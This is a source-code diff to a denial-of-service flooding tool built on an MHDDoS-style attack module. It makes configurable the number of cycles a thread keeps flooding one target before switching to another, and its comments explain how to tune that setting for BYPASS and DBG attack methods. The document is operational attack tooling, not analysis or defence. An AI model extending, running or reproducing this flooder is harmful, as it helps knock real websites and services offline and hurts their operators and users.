@@ -68,9 +68,10 @@ class DaemonThreadPool(Executor):
 
 class Flooder(Thread):
 
-    def __init__(self, event, args_list):
+    def __init__(self, event, args_list, work_steal_cycles: int = 100):
         super(Flooder, self).__init__(daemon=True)
         self._event = event
+        self._work_steal_cycles = work_steal_cycles
         runnables = [mhddos_main(**kwargs) for kwargs in args_list]
         random.shuffle(runnables)
         self._runnables_iter = cycle(runnables)
@@ -81,20 +82,19 @@ class Flooder(Thread):
             # The logic here is the following:
             # 1) pick up random target to attack
             # 2) run a single session, receive back number of packets being sent
-            # 3) if session was "succesfull" (non zero packets), keep executing
+            # 3) if session was "succesfull" (non zero packets), keep executing for
+            #    {work_steal_cycles} number of cycles
             # 4) otherwise, go back to 1)
             # The idea is that if a specific target doesn't work,
             # the thread will pick another work to do (steal).
             # The definition of "success" could be extended to cover more use cases.
             #
-            # XXX: we have to make sure temporarly dead target won't be
-            # excluded from the scheduling forever. As it might be the case all other
-            # targets are going to just work forever. Like, this requires are to
-            # have shared iterator (back where we started). Experimenting with just
-            # using max number of cycles (though ideally this should depend on execution
-            # time not on the number of calls).
+            # As an attempt to steal work happens after fixed number of cycles,
+            # one should be careful with the configuration. If each cycle takes too
+            # long (for example BYPASS or DBG attacks are used), the number should
+            # be set to be relatively small.
             runnable = next(self._runnables_iter)
-            alive, cycles = True, 100
+            alive, cycles = True, self._work_steal_cycles
             while alive and cycles > 0:
                 try:
                     alive = runnable.run() > 0
